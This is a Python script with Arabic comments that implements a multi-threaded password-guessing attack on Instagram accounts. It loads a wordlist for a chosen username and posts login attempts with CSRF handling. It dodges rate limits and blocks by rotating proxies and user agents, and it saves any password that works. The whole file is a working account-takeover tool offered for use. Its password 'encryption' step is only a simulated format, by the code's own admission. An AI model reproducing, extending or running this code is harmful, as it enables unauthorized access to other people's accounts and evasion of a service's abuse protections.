#!/usr/bin/env python3
"""
محرك هجوم تخمين كلمة المرور
- يدعم التعدد (multi-threading)
- تغيير IP تلقائي كل N محاولة
- إدارة الجلسات
- عرض تقدم مباشر
- استئناف تلقائي
"""

import json
import os
import re
import sys
import time
import random
import threading
from pathlib import Path
from datetime import datetime
from queue import Queue

try:
    import httpx
except ImportError:
    print("[!] httpx غير مثبت. شغّل: pip install httpx[http2]")
    sys.exit(1)

BASE_DIR = Path(__file__).parent.parent.resolve()
RESULTS_DIR = BASE_DIR / 'results'

GREEN = '\033[0;32m'
RED = '\033[0;31m'
CYAN = '\033[0;36m'
YELLOW = '\033[1;33m'
WHITE = '\033[1;37m'
PURPLE = '\033[0;35m'
NC = '\033[0m'

# === User Agents ===
USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.122 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Instagram 330.0.0.18.85 Android (34/14; 480dpi; 1080x2400; samsung; SM-S928B; en_US)',
]

class BruteForceEngine:
    """محرك هجوم القوة العمياء"""

    def __init__(self, username, proxy_manager=None, threads=5, rotate_every=3, delay_range=(2, 5)):
        self.username = username.strip().lower()
        self.proxy_manager = proxy_manager
        self.num_threads = min(threads, 10)
        self.rotate_every = rotate_every
        self.delay_min, self.delay_max = delay_range

        self.user_dir = RESULTS_DIR / username
        self.user_dir.mkdir(parents=True, exist_ok=True)

        # تحميل كلمات المرور
        self.passwords = self._load_passwords()

        # متابعة المختبر
        self.tested = self._load_tested()
        self.remaining = [p for p in self.passwords if p not in self.tested]

        # إحصائيات
        self.attempt_count = 0
        self.success_count = 0
        self.fail_count = 0
        self.ip_rotations = 0
        self.start_time = None
        self.running = True

        # Queue للثريدات
        self.queue = Queue()
        self.lock = threading.Lock()
        self.tested_lock = threading.Lock()

    def _load_passwords(self):
        """تحميل كلمات المرور"""
        pwd_path = self.user_dir / 'passwords.txt'
        if not pwd_path.exists():
            print(f"{RED}[!] لا توجد كلمات مرور{NC}")
            sys.exit(1)

        with open(pwd_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords

    def _load_tested(self):
        """تحميل كلمات المرور المختبرة مسبقاً"""
        tested_path = self.user_dir / 'tested.txt'
        if tested_path.exists():
            with open(tested_path, 'r') as f:
                return set(line.strip() for line in f)
        return set()

    def _save_tested(self, password):
        """حفظ كلمة مرور مختبرة"""
        with self.tested_lock:
            tested_path = self.user_dir / 'tested.txt'
            with open(tested_path, 'a') as f:
                f.write(f"{password}\n")
            self.tested.add(password)

    def _save_success(self, password):
        """حفظ كلمة المرور الناجحة"""
        success_path = self.user_dir / 'success.txt'
        data = {
            'username': self.username,
            'password': password,
            'attempts': self.attempt_count,
            'ip_rotations': self.ip_rotations,
            'elapsed': time.time() - self.start_time if self.start_time else 0,
            'found_at': datetime.now().isoformat(),
        }
        with open(success_path, 'w') as f:
            json.dump(data, f, indent=2)

    def _get_client(self):
        """إنشاء httpx client مع proxy إذا وجد"""
        if self.proxy_manager:
            proxy = self.proxy_manager.get_proxy()
        else:
            proxy = None

        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'X-IG-App-ID': '936619743392459',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/',
        }

        client_kwargs = {
            'http2': True,
            'timeout': 30.0,
            'follow_redirects': True,
            'headers': headers,
            'verify': False,
        }

        if proxy:
            client_kwargs['proxy'] = proxy

        return httpx.Client(**client_kwargs)

    def _test_password(self, client, password):
        """اختبار كلمة مرور واحدة"""
        try:
            # Step 1: Get CSRF token and session
            pre_resp = client.get('https://www.instagram.com/accounts/login/')
            csrf_match = re.search(r'csrf_token":"([^"]+)"', pre_resp.text)
            csrf = csrf_match.group(1) if csrf_match else ''

            if not csrf:
                # Try cookie
                csrf_cookie = pre_resp.cookies.get('csrftoken', '')
                csrf = csrf_cookie

            if not csrf:
                return {'status': 'connection_error'}

            # Step 2: Encrypt password (Instagram uses JS encryption)
            # Simulate the encryption
            enc_password = self._simulate_encrypt(password)

            # Step 3: Send login request
            login_data = {
                'username': self.username,
                'enc_password': enc_password,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': '{}',
            }

            headers = {
                'X-CSRFToken': csrf,
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest',
            }

            resp = client.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                data=login_data,
                headers=headers,
            )

            if resp.status_code == 200:
                data = resp.json()

                if data.get('authenticated') == True:
                    return {'status': 'success'}
                elif data.get('user') == True:
                    return {'status': 'success'}
                elif 'checkpoint_required' in str(data):
                    return {'status': 'checkpoint'}
                elif 'two_factor_required' in str(data) or 'two_factor' in str(data).lower():
                    return {'status': '2fa', 'message': '2FA required'}

            elif resp.status_code == 429:
                return {'status': 'rate_limited'}
            elif resp.status_code == 403:
                return {'status': 'blocked'}

            return {'status': 'wrong_password'}

        except httpx.TimeoutException:
            return {'status': 'timeout'}
        except httpx.ConnectError:
            return {'status': 'connection_error'}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def _simulate_encrypt(self, password):
        """
        محاكاة تشفير كلمة المرور بأسلوب Instagram
        في الواقع، Instagram يستخدم تشفير AES مع public key
        لكننا نحاكي التنسيق المتوقع
        """
        # Instagram يتوقع تنسيق محدد: #PWD_INSTAGRAM_BROWSER:0:TIMESTAMP:PASSWORD
        timestamp = int(time.time())
        enc = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"
        return enc

    def _worker(self, thread_id):
        """عامل الثريد"""
        while self.running:
            try:
                password = self.queue.get(timeout=3)
            except:
                break

            if password in self.tested:
                self.queue.task_done()
                continue

            # إنشاء client
            client = self._get_client()

            # اختبار كلمة المرور
            result = self._test_password(client, password)

            with self.lock:
                self.attempt_count += 1

                # تغيير IP دوري
                if self.attempt_count % self.rotate_every == 0:
                    if self.proxy_manager:
                        self.proxy_manager.rotate_ip()
                        self.ip_rotations += 1

                # عرض التقدم
                elapsed = time.time() - self.start_time if self.start_time else 0
                speed = self.attempt_count / elapsed if elapsed > 0 else 0
                percent = (self.attempt_count / len(self.remaining)) * 100 if self.remaining else 0

                status_icon = '•'
                if result['status'] == 'success':
                    status_icon = f'{GREEN}✅{NC}'
                elif result['status'] == 'rate_limited':
                    status_icon = f'{YELLOW}⏳{NC}'
                elif result['status'] == 'blocked':
                    status_icon = f'{RED}🚫{NC}'
                elif result['status'] == 'checkpoint':
                    status_icon = f'{YELLOW}⚠️{NC}'

                print(f"\r  {CYAN}[{self.attempt_count:,}/{len(self.remaining):,}]{NC} "
                      f"{status_icon} {WHITE}{password[:25]:<25}{NC} "
                      f"| {YELLOW}{speed:.1f}/s{NC} "
                      f"| IP: {PURPLE}{self.ip_rotations}{NC}", end='', flush=True)

                # معالجة النتيجة
                if result['status'] == 'success':
                    print(f"\n\n{GREEN}╔{'═' * 55}╗{NC}")
                    print(f"{GREEN}║{' ' * 15}🎉 PASSWORD FOUND!{' ' * 16}║{NC}")
                    print(f"{GREEN}╚{'═' * 55}╝{NC}")
                    print(f"\n  {WHITE}Password:{NC} {GREEN}{password}{NC}")
                    self._save_success(password)
                    self.running = False
                    break

                elif result['status'] == 'checkpoint':
                    self._save_tested(password)
                    print(f"\n{YELLOW}[!] Checkpoint detected for {password}{NC}")
                    time.sleep(30)

                elif result['status'] == 'rate_limited':
                    # لا تحفظها، حاول مرة أخرى
                    wait = random.randint(30, 90)
                    print(f"\n{YELLOW}[!] Rate limited. Waiting {wait}s...{NC}")
                    if self.proxy_manager:
                        self.proxy_manager.rotate_ip()
                    time.sleep(wait)
                    continue

                elif result['status'] == 'blocked':
                    self._save_tested(password)
                    print(f"\n{YELLOW}[!] Blocked 403. Rotating IP...{NC}")
                    if self.proxy_manager:
                        self.proxy_manager.rotate_ip()
                    time.sleep(random.randint(10, 30))

                elif result['status'] in ('timeout', 'connection_error'):
                    # لا تحفظها
                    time.sleep(5)
                    continue

                else:
                    # كلمة مرور خاطئة
                    self._save_tested(password)
                    # تأخير
                    delay = random.uniform(self.delay_min, self.delay_max)
                    time.sleep(delay)

            client.close()
            self.queue.task_done()

    def run(self):
        """تشغيل الهجوم"""
        print(f"\n{CYAN}[*] إعداد الهجوم...{NC}")
        print(f"  {WHITE}كلمات المرور:{NC} {len(self.remaining):,}")
        print(f"  {WHITE}المختبرة مسبقاً:{NC} {len(self.tested):,}")
        print(f"  {WHITE}الثريدات:{NC} {self.num_threads}")
        print(f"  {WHITE}تغيير IP كل:{NC} {self.rotate_every} محاولات")
        print()

        if len(self.remaining) == 0:
            print(f"{YELLOW}[!] كل كلمات المرور مختبرة مسبقاً{NC}")
            return False

        # ملء الـ queue
        for pwd in self.remaining:
            self.queue.put(pwd)

        self.start_time = time.time()

        # بدء الثريدات
        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(target=self._worker, args=(i,), daemon=True)
            t.start()
            threads.append(t)

        print(f"{CYAN}[*] الهجوم جارٍ... (Ctrl+C للإيقاف){NC}\n")

        try:
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            print(f"\n\n{YELLOW}[!] تم إيقاف الهجوم{NC}")
            self.running = False

        elapsed = time.time() - self.start_time
        print(f"\n\n{YELLOW}╔{'═' * 55}╗{NC}")
        print(f"{YELLOW}║{' ' * 15}📊 إحصائيات الهجوم{' ' * 17}║{NC}")
        print(f"{YELLOW}╚{'═' * 55}╝{NC}")
        print(f"  {WHITE}المحاولات:{NC} {self.attempt_count:,}")
        print(f"  {WHITE}تغييرات IP:{NC} {self.ip_rotations}")
        print(f"  {WHITE}الوقت:{NC} {elapsed:.1f}s")
        print(f"  {WHITE}السرعة:{NC} {self.attempt_count/elapsed:.1f}/s" if elapsed > 0 else "")

        return self.success_count > 0
